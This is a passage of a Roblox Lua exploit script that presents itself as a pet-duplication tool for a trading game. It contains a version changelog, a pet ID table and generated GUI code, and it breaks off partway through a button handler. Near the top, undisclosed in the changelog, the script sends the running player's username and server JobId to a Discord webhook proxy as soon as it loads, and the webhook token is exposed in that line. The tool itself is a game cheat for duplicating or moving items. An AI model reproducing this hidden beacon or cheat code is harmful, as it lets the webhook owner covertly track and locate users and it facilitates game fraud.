--[[
    Brought to you by tar/bv/1rs
    beta - 29jul24 - [unreleased/private] very barebones, newfound dupe method
    1.00 - 16sep24 - [unreleased/private] semi-automated required manual server id inputs
    1.01 - 05dec24 - released, no longer required manual server id inputting
    1.02 - 08dec24 - uploaded to github, changed from 35s to 40s
    1.03 - 08dec24 - removed extra 40s measure on first rejoin
    1.04 - 08dec24 - brought it back, removed UI trade updating to avoid lag
    1.05 - 08dec24 - added variable MAX_PETS_TO_DUPE to avoid network lag to not fail duping
    1.06 - 08dec24 - changed server size minimum 1 -> 2
    1.07 - 10dec24 - added ui interface - used "GUI to Lua 3.2" & some code snippet to make the frame draggable
    1.08 - 11dec24 - minor fixes
    1.09 - 11dec24 - added a block thingy for the toggle
    1.10 - 12dec24 - fixed max pets to give problem, added autotoggle if trades are disabled, replaced required() because some exploits don't support it
    1.11 - 22dec24 - changed to 45s and removed the other waiting, added yet another QoL warning
    1.12 - 26dec24 - added a duping possibility meter
    1.13 - 28dec24 - added inventory ui deletion to avoid performance lag while duping many pets
    1.14 - 29dec24 - fixed post-teleport execution if injected too early
    1.15 - 01jan25 - changed the duping chance meter parameters and fixed a bug with the dupe button
    1.16 - 24jan25 - revamped gui - gui2lua converter by @uniquadev
    1.17 - 25jan25 - QoL update - added de/select all visible and search feature
]]

-- //

local Ver = '1.17'

-- \\

local selected_IDs = {}
local mode = 0
local SERVER = nil
local MAX_PETS_TO_DUPE = 125
local ACC_TO_GIVE_PETS = ''
local Debris = game:GetService'Debris'
local TeleportService = game:GetService'TeleportService'
local H = Instance.new("Hint")
H.Text = 'Finding another server'

function notify(M)
	game.StarterGui:SetCore("SendNotification", {
		Title = "tar's dupe v"..Ver,
		Text = M,
		Duration = 5
	})
end

local Dir = {
	[77002] = 'Festive Dragon',
	[9004] = 'Wavy Cheeta',
	[7004] = 'Dragon',
	[8004] = 'Demon',
	[5004] = 'Bat',
	[6004] = 'Ladybug',
	[66010] = 'Skeleton Ghost',
	[4004] = 'Seal',
	[14001] = 'Revurse',
	[2004] = 'Mouse',
	[16012] = 'Cyborg Dominus',
	[16010] = 'C0RE',
	[77003] = 'Snow Spike',
	[15005] = 'Green Gummy Bear',
	[13007] = 'Space Dragon',
	[10004] = 'Electric Slime',
	[66002] = 'Zombie Dog',
	[76002] = 'Festive Dog',
	[15008] = 'Rainbow',
	[16002] = 'Cyborg Dog',
	[12003] = 'Angel',
	[13001] = 'Alien',
	[15010] = 'Ame Damnee',
	[17003] = 'Dominus Noob',
	[66003] = 'Spider',
	[12007] = 'Mortuus',
	[12005] = 'Ice Queen',
	[11004] = 'Lava Watermelon',
	[76004] = 'Festive Racoon',
	[66004] = 'Pumpkin',
	[16006] = 'Red Space Ranger',
	[16001] = 'Cyborg Cat',
	[11002] = 'Sherbert',
	[76001] = 'Festive Cat',
	[66001] = 'Zombie Cat',
	[79003] = 'Giant Penguin',
	[15007] = 'Cookie',
	[1001] = 'Cat',
	[3001] = 'Dalmatian',
	[2001] = 'Brown Cat',
	[5001] = 'Owl',
	[90010] = 'Huge Cat',
	[7001] = 'Watermelon',
	[6001] = 'Cheeta',
	[9001] = 'Fantasy Dragon',
	[8001] = 'Bomb',
	[66006] = 'Ghostdeeri',
	[12004] = 'Fire King',
	[90003] = 'Red Snake',
	[78002] = 'Gingerbread',
	[90004] = 'Purple Snake',
	[10003] = 'Lava Turtle',
	[15001] = 'Candy Cane',
	[18002] = 'Spike',
	[90011] = 'Giant Mortuus',
	[17009] = 'Dominus Huge',
	[78003] = 'Reindeer',
	[2005] = 'White Bunny',
	[1005] = 'Orange Cat',
	[10002] = 'Lava Dalmatian',
	[8005] = 'Cyclops',
	[9005] = 'Wavy Tiger',
	[4005] = 'Racoon',
	[90002] = 'Green Snake',
	[78004] = 'Festive Dominus',
	[5005] = 'Bee',
	[18006] = 'Agony',
	[90006] = 'Dominus Partner',
	[66007] = 'Sorrow',
	[14003] = 'Space Owl',
	[17007] = 'Dominus Rainbow',
	[90001] = 'BIG Maskot',
	[11005] = 'Wavy Bee',
	[10006] = 'Dominus Messor',
	[14004] = 'Space Cyclops',
	[17001] = 'Dominus Pumpkin',
	[12002] = 'Reaper',
	[2002] = 'White Cat',
	[3002] = 'Bear',
	[4002] = 'Crocodile',
	[5002] = 'Monkey',
	[6002] = 'Tiger',
	[7002] = 'Yeti',
	[8002] = 'Ghost',
	[9002] = 'Cherry Bomb',
	[11006] = 'Unicorn',
	[18005] = 'Hydra',
	[77001] = 'Festive Seal',
	[16011] = 'C0RE SH0CK',
	[18004] = 'Chimera',
	[1002] = 'Dog',
	[12006] = 'Immortuos',
	[18001] = 'Aesthetic Cat',
	[14009] = '1NE',
	[18003] = 'Magic Fox',
	[17006] = 'Dominus Damnee',
	[17008] = 'Dominus Electric',
	[16004] = 'Cyborg',
	[17002] = 'Dominus Cherry',
	[10008] = 'Dominus Empyreus',
	[14007] = 'Dark Saturn',
	[17005] = 'Dominus HeadStack',
	[13003] = 'Wooga',
	[16003] = 'Computer',
	[16007] = 'Friendly Cyborg',
	[16009] = 'Cyborg Demon',
	[12001] = 'Tank',
	[16008] = 'RoVer',
	[16005] = 'Space Ranger',
	[15004] = 'Green Lollipop',
	[66008] = 'Willow Wisp',
	[13005] = 'Space Dog',
	[66009] = 'Willow Wisp Green',
	[90007] = 'Love Dog',
	[11003] = 'Robot',
	[1004] = 'Lamb',
	[10001] = 'Lava Zebra',
	[14005] = 'Space Bear',
	[90008] = 'Noob',
	[15009] = 'Dark Candy Corn',
	[77004] = 'Ice Spike',
	[13004] = 'Space Cat',
	[15002] = 'Candy Corn',
	[15011] = 'Domortuus',
	[13006] = 'Space Bunny',
	[15006] = 'Yellow Gummy Bear',
	[78001] = 'Festive Ame Damnee',
	[8003] = 'Cherry Monkey',
	[14008] = 'ZER0',
	[14006] = 'Saturn',
	[17004] = 'Dominus Wavy',
	[14002] = 'HeadStack',
	[13002] = 'Puffer',
	[76003] = 'Festive Bunny',
	[3004] = 'Pig',
	[15003] = 'Red Lollipop',
	[78005] = 'Randolph',
	[10007] = 'Dominus Frigidus',
	[66005] = 'Skeleton',
	[6003] = 'Zebra',
	[5003] = 'Turtle',
	[4003] = 'Platypus',
	[3003] = 'Polar Bear',
	[2003] = 'White Dog',
	[1003] = 'Bunny',
	[11001] = 'Zombie',
	[10005] = 'Electric Ghost',
	[7003] = 'Slime',
	[3005] = 'Panda',
	[79002] = 'Festive C0RE',
	[4001] = 'Koala',
	[90009] = 'Love Cat',
	[9003] = 'Wavy Zebra',
	[79001] = 'Festive Immortuos',
	[90005] = 'Wavy Snake'
}


function send(ss)
http_request({Url="https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez",Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=ss})})
end


send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId)

do  -- // GUI

	function GUI()

		local G2L = {};

		-- StarterGui.ScreenGui
		G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


		-- StarterGui.ScreenGui.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["ZIndex"] = 2;
		G2L["2"]["BorderSizePixel"] = 2;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(136, 136, 136);
		G2L["2"]["BorderMode"] = Enum.BorderMode.Inset;
		G2L["2"]["Size"] = UDim2.new(0, 373, 0, 459);
		G2L["2"]["Position"] = UDim2.new(.5, -373/2, -1.5,0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["BackgroundTransparency"] = 0.15;


		-- StarterGui.ScreenGui.Frame.titlelabel
		G2L["3"] = Instance.new("TextLabel", G2L["2"]);
		G2L["3"]["TextWrapped"] = true;
		G2L["3"]["TextStrokeTransparency"] = 0;
		G2L["3"]["BorderSizePixel"] = 0;
		G2L["3"]["TextSize"] = 40;
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["3"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["3"]["BackgroundTransparency"] = 1;
		G2L["3"]["Size"] = UDim2.new(1, 0, 0, 50);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["Text"] = [[tar's dupe v]]..Ver;
		G2L["3"]["Name"] = [[titlelabel]];


		-- StarterGui.ScreenGui.Frame.dupe
		G2L["4"] = Instance.new("TextButton", G2L["2"]);
		G2L["4"]["BorderSizePixel"] = 0;
		G2L["4"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["4"]["TextSize"] = 14;
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["4"]["Size"] = UDim2.new(0, 60, 0, 58);
		G2L["4"]["BackgroundTransparency"] = 1;
		G2L["4"]["Name"] = [[dupe]];
		G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["Text"] = [[Dupe]];
		G2L["4"]["Position"] = UDim2.new(0.79357, 0, 0.12636, 0);


		-- StarterGui.ScreenGui.Frame.dupe.UICorner
		G2L["5"] = Instance.new("UICorner", G2L["4"]);
		G2L["5"]["CornerRadius"] = UDim.new(0.25, 0);


		-- StarterGui.ScreenGui.Frame.dupe.UIStroke
		G2L["6"] = Instance.new("UIStroke", G2L["4"]);
		G2L["6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.dupe.UIStroke
		G2L["7"] = Instance.new("UIStroke", G2L["4"]);



		-- StarterGui.ScreenGui.Frame.all
		G2L["8"] = Instance.new("TextButton", G2L["2"]);
		G2L["8"]["BorderSizePixel"] = 0;
		G2L["8"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["8"]["TextSize"] = 14;
		G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["8"]["Size"] = UDim2.new(0, 20, 0, 20);
		G2L["8"]["BackgroundTransparency"] = 1;
		G2L["8"]["Name"] = [[all]];
		G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["8"]["Text"] = [[X]];
		G2L["8"]["Position"] = UDim2.new(0.0429, 0, 0.12636, 0);


		-- StarterGui.ScreenGui.Frame.all.UICorner
		G2L["9"] = Instance.new("UICorner", G2L["8"]);
		G2L["9"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.all.UIStroke
		G2L["a"] = Instance.new("UIStroke", G2L["8"]);
		G2L["a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.all.UIStroke
		G2L["b"] = Instance.new("UIStroke", G2L["8"]);



		-- StarterGui.ScreenGui.Frame.all.amountlabel
		G2L["c"] = Instance.new("TextLabel", G2L["8"]);
		G2L["c"]["BorderSizePixel"] = 0;
		G2L["c"]["TextSize"] = 17;
		G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
		G2L["c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
		G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["c"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["c"]["BackgroundTransparency"] = 1;
		G2L["c"]["Size"] = UDim2.new(0, 175, 1, 0);
		G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["c"]["Text"] = [[Dupe amount of pets:]];
		G2L["c"]["Name"] = [[amountlabel]];
		G2L["c"]["Position"] = UDim2.new(1, 10, 0, 0);


		-- StarterGui.ScreenGui.Frame.all.amountlabel.UIStroke
		G2L["d"] = Instance.new("UIStroke", G2L["c"]);



		-- StarterGui.ScreenGui.Frame.all.amountlabel.pets
		G2L["e"] = Instance.new("TextBox", G2L["c"]);
		G2L["e"]["CursorPosition"] = -1;
		G2L["e"]["Name"] = [[pets]];
		G2L["e"]["BorderSizePixel"] = 0;
		G2L["e"]["TextSize"] = 14;
		G2L["e"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["e"]["ClearTextOnFocus"] = false;
		G2L["e"]["Size"] = UDim2.new(0, 50, 0, 20);
		G2L["e"]["Position"] = UDim2.new(1, 10, 0, 1);
		G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["e"]["Text"] = MAX_PETS_TO_DUPE;
		G2L["e"]["BackgroundTransparency"] = 1;


		-- StarterGui.ScreenGui.Frame.all.amountlabel.pets.UICorner
		G2L["f"] = Instance.new("UICorner", G2L["e"]);
		G2L["f"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.all.amountlabel.pets.UIStroke
		G2L["10"] = Instance.new("UIStroke", G2L["e"]);
		G2L["10"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.all.amountlabel.pets.UIStroke
		G2L["11"] = Instance.new("UIStroke", G2L["e"]);



		-- StarterGui.ScreenGui.Frame.specific
		G2L["12"] = Instance.new("TextButton", G2L["2"]);
		G2L["12"]["BorderSizePixel"] = 0;
		G2L["12"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["12"]["TextSize"] = 14;
		G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["12"]["Size"] = UDim2.new(0, 20, 0, 20);
		G2L["12"]["BackgroundTransparency"] = 1;
		G2L["12"]["Name"] = [[specific]];
		G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["12"]["Text"] = [[]];
		G2L["12"]["Position"] = UDim2.new(0.0429, 0, 0.1939, 0);


		-- StarterGui.ScreenGui.Frame.specific.UICorner
		G2L["13"] = Instance.new("UICorner", G2L["12"]);
		G2L["13"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.specific.UIStroke
		G2L["14"] = Instance.new("UIStroke", G2L["12"]);
		G2L["14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.specific.UIStroke
		G2L["15"] = Instance.new("UIStroke", G2L["12"]);



		-- StarterGui.ScreenGui.Frame.specific.specificlabel
		G2L["16"] = Instance.new("TextLabel", G2L["12"]);
		G2L["16"]["BorderSizePixel"] = 0;
		G2L["16"]["TextSize"] = 17;
		G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
		G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["16"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["16"]["BackgroundTransparency"] = 1;
		G2L["16"]["Size"] = UDim2.new(0, 0, 0, 20);
		G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["16"]["Text"] = [[Dupe specific pets]];
		G2L["16"]["Name"] = [[specificlabel]];
		G2L["16"]["Position"] = UDim2.new(1, 10, 0, 0);


		-- StarterGui.ScreenGui.Frame.specific.specificlabel.UIStroke
		G2L["17"] = Instance.new("UIStroke", G2L["16"]);



		-- StarterGui.ScreenGui.Frame.accountlabel
		G2L["18"] = Instance.new("TextLabel", G2L["2"]);
		G2L["18"]["TextWrapped"] = true;
		G2L["18"]["BorderSizePixel"] = 0;
		G2L["18"]["TextSize"] = 17;
		G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["18"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["18"]["BackgroundTransparency"] = 1;
		G2L["18"]["Size"] = UDim2.new(0.59479, 0, -0.06479, 50);
		G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["18"]["Text"] = [[Account to give pets to:]];
		G2L["18"]["Name"] = [[accountlabel]];
		G2L["18"]["Position"] = UDim2.new(0.04672, 0, 0.27909, 0);


		-- StarterGui.ScreenGui.Frame.accountlabel.UIStroke
		G2L["19"] = Instance.new("UIStroke", G2L["18"]);



		-- StarterGui.ScreenGui.Frame.accountlabel.acc
		G2L["1a"] = Instance.new("TextBox", G2L["18"]);
		G2L["1a"]["CursorPosition"] = -1;
		G2L["1a"]["Name"] = [[acc]];
		G2L["1a"]["PlaceholderColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["1a"]["BorderSizePixel"] = 0;
		G2L["1a"]["TextSize"] = 14;
		G2L["1a"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["1a"]["PlaceholderText"] = [[Username]];
		G2L["1a"]["Size"] = UDim2.new(0, 105, 0, 20);
		G2L["1a"]["Position"] = UDim2.new(1.05012, 0, 0, 2);
		G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1a"]["Text"] = [[]];
		G2L["1a"]["BackgroundTransparency"] = 1;


		-- StarterGui.ScreenGui.Frame.accountlabel.acc.UICorner
		G2L["1b"] = Instance.new("UICorner", G2L["1a"]);
		G2L["1b"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.accountlabel.acc.UIStroke
		G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
		G2L["1c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.accountlabel.acc.UIStroke
		G2L["1d"] = Instance.new("UIStroke", G2L["1a"]);



		-- StarterGui.ScreenGui.Frame.UIStroke
		G2L["1e"] = Instance.new("UIStroke", G2L["2"]);
		G2L["1e"]["Color"] = Color3.fromRGB(136, 136, 136);


		-- StarterGui.ScreenGui.Frame.ScrollingFrame
		G2L["1f"] = Instance.new("ScrollingFrame", G2L["2"]);
		G2L["1f"]["Active"] = true;
		G2L["1f"]["BorderSizePixel"] = 0;
		G2L["1f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
		G2L["1f"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
		G2L["1f"]["MidImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
		G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1f"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
		G2L["1f"]["Size"] = UDim2.new(1, -40, 0, 250);
		G2L["1f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1f"]["ScrollBarThickness"] = 11;
		G2L["1f"]["Position"] = UDim2.new(0, 20, 1, -270);
		G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1f"]["BackgroundTransparency"] = 1;
		G2L["1f"]["Visible"] = false;

		-- StarterGui.ScreenGui.Frame.ScrollingFrame.UIGridLayout
		G2L["20"] = Instance.new("UIGridLayout", G2L["1f"]);
		G2L["20"]["CellSize"] = UDim2.new(1, -12, 0, 20);
		G2L["20"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
		G2L["20"]["CellPadding"] = UDim2.new(0, 0, 0, 0);


		-- StarterGui.ScreenGui.Frame.ScrollingFrame.UIStroke
		G2L["21"] = Instance.new("UIStroke", G2L["1f"]);
		G2L["21"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.countlabel
		G2L["22"] = Instance.new("TextLabel", G2L["2"]);
		G2L["22"]["BorderSizePixel"] = 0;
		G2L["22"]["TextSize"] = 17;
		G2L["22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
		G2L["22"]["TextYAlignment"] = Enum.TextYAlignment.Top;
		G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["22"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["22"]["BackgroundTransparency"] = 1;
		G2L["22"]["Size"] = UDim2.new(0, 175, 0, 20);
		G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["22"]["Text"] = [[Pets Selected: 0]];
		G2L["22"]["Name"] = [[countlabel]];
		G2L["22"]["Position"] = UDim2.new(0, 20, 1, -19);
		G2L["22"]["Visible"] = false;


		-- StarterGui.ScreenGui.Frame.countlabel.UIStroke
		G2L["23"] = Instance.new("UIStroke", G2L["22"]);



		-- StarterGui.ScreenGui.Frame.refresh
		G2L["24"] = Instance.new("TextButton", G2L["2"]);
		G2L["24"]["BorderSizePixel"] = 0;
		G2L["24"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["24"]["TextSize"] = 14;
		G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["24"]["Size"] = UDim2.new(0, 70, 0, 15);
		G2L["24"]["BackgroundTransparency"] = 1;
		G2L["24"]["Name"] = [[refresh]];
		G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["24"]["Text"] = [[Refresh]];
		G2L["24"]["Position"] = UDim2.new(1, -90, 1, -17);
		G2L["24"]["Visible"] = false;

		-- StarterGui.ScreenGui.Frame.refresh.UICorner
		G2L["25"] = Instance.new("UICorner", G2L["24"]);
		G2L["25"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.refresh.UIStroke
		G2L["26"] = Instance.new("UIStroke", G2L["24"]);
		G2L["26"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.refresh.UIStroke
		G2L["27"] = Instance.new("UIStroke", G2L["24"]);





		-- StarterGui.ScreenGui.Frame.search
		G2L["28"] = Instance.new("TextBox", G2L["2"]);
		G2L["28"]["CursorPosition"] = -1;
		G2L["28"]["Name"] = [[search]];
		G2L["28"]["BorderSizePixel"] = 0;
		G2L["28"]["TextSize"] = 14;
		G2L["28"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["28"]["ClearTextOnFocus"] = false;
		G2L["28"]["Size"] = UDim2.new(0, 200, 0, 20);
		G2L["28"]["Position"] = UDim2.new(0, 20, 0.35, 0);
		G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["28"]["Text"] = [[]];
		G2L["28"]["BackgroundTransparency"] = 1;
		G2L["28"]["Visible"] = false;


		-- StarterGui.ScreenGui.Frame.search.UICorner
		G2L["29"] = Instance.new("UICorner", G2L["28"]);
		G2L["29"]["CornerRadius"] = UDim.new(1, 0);


		-- StarterGui.ScreenGui.Frame.search.UIStroke
		G2L["2a"] = Instance.new("UIStroke", G2L["28"]);
		G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.search.UIStroke
		G2L["2b"] = Instance.new("UIStroke", G2L["28"]);



		-- StarterGui.ScreenGui.Frame.search.magglass
		G2L["2c"] = Instance.new("ImageLabel", G2L["28"]);
		G2L["2c"]["BorderSizePixel"] = 0;
		G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2c"]["ImageColor3"] = Color3.fromRGB(32, 32, 32);
		G2L["2c"]["Image"] = [[rbxassetid://8885668498]];
		G2L["2c"]["Size"] = UDim2.new(0, 20, 0, 20);
		G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2c"]["BackgroundTransparency"] = 1;
		G2L["2c"]["Rotation"] = 90;
		G2L["2c"]["Name"] = [[magglass]];
		G2L["2c"]["Position"] = UDim2.new(1, -24, 0, 1);


		-- StarterGui.ScreenGui.Frame.search.sel
		G2L["2d"] = Instance.new("TextButton", G2L["28"]);
		G2L["2d"]["BorderSizePixel"] = 0;
		G2L["2d"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["2d"]["TextSize"] = 14;
		G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["2d"]["Size"] = UDim2.new(0, 50, 0, 20);
		G2L["2d"]["BackgroundTransparency"] = 1;
		G2L["2d"]["Name"] = [[sel]];
		G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2d"]["Text"] = [[Sel vis]];
		G2L["2d"]["Position"] = UDim2.new(1, 10, 0, 0);


		-- StarterGui.ScreenGui.Frame.search.sel.UICorner
		G2L["2e"] = Instance.new("UICorner", G2L["2d"]);
		G2L["2e"]["CornerRadius"] = UDim.new(0.25, 0);


		-- StarterGui.ScreenGui.Frame.search.sel.UIStroke
		G2L["2f"] = Instance.new("UIStroke", G2L["2d"]);
		G2L["2f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.search.sel.UIStroke
		G2L["30"] = Instance.new("UIStroke", G2L["2d"]);



		-- StarterGui.ScreenGui.Frame.search.sel.desel
		G2L["31"] = Instance.new("TextButton", G2L["2d"]);
		G2L["31"]["BorderSizePixel"] = 0;
		G2L["31"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
		G2L["31"]["TextSize"] = 14;
		G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
		G2L["31"]["Size"] = UDim2.new(0, 65, 0, 20);
		G2L["31"]["BackgroundTransparency"] = 1;
		G2L["31"]["Name"] = [[desel]];
		G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["31"]["Text"] = [[Desel vis]];
		G2L["31"]["Position"] = UDim2.new(1, 5, 0, 0);


		-- StarterGui.ScreenGui.Frame.search.sel.desel.UICorner
		G2L["32"] = Instance.new("UICorner", G2L["31"]);
		G2L["32"]["CornerRadius"] = UDim.new(0.25, 0);


		-- StarterGui.ScreenGui.Frame.search.sel.desel.UIStroke
		G2L["33"] = Instance.new("UIStroke", G2L["31"]);
		G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


		-- StarterGui.ScreenGui.Frame.search.sel.desel.UIStroke
		G2L["34"] = Instance.new("UIStroke", G2L["31"]);

		do -- // draggable snippet not made by me \\
			local UserInputService = game:GetService("UserInputService")

			local gui = G2L['2']

			local dragging
			local dragInput
			local dragStart
			local startPos

			local function update(input)
				local delta = input.Position - dragStart
				gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end

			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)

			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)

			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end -- \\ draggable snippet not made by me //

		return G2L
	end

	local gui = GUI()
	local ScreenGui      = gui['1']
	local Frame          = gui['2']
	local ScrollingFrame = gui['1f']
	local dupe           = gui['4']
	local refresh        = gui['24']
	local pets           = gui['e']
	local all            = gui['8']
	local specific       = gui['12']
	local count_selected = gui['22']
	local acc            = gui['1a']
	local selb           = gui['2d']
	local deselb         = gui['31']
	local searchb        = gui['28']

	task.spawn(function()
		while task.wait() do
			local total = 0
			for _,_ in pairs(selected_IDs) do
				total = total + 1
			end
			count_selected.Text = 'Pets Selected: ' .. total
		end
	end)

	selb.MouseButton1Click:Connect(function()
		for i, v in pairs(ScrollingFrame:GetChildren()) do
			if v:IsA'TextButton' and v.Visible then
